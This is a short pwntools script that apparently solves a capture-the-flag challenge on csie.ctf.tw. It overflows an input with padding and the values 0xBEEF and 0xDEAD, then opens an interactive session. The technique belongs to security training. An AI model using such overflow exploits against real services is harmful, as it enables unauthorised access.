#!/usr/bin/python
from pwn import *

host = 'csie.ctf.tw'
port = 10125

r = remote(host, port)
r.recvuntil('?')
r.sendline('a'*8 + p32(48879) + p32(57005))
r.interactive()
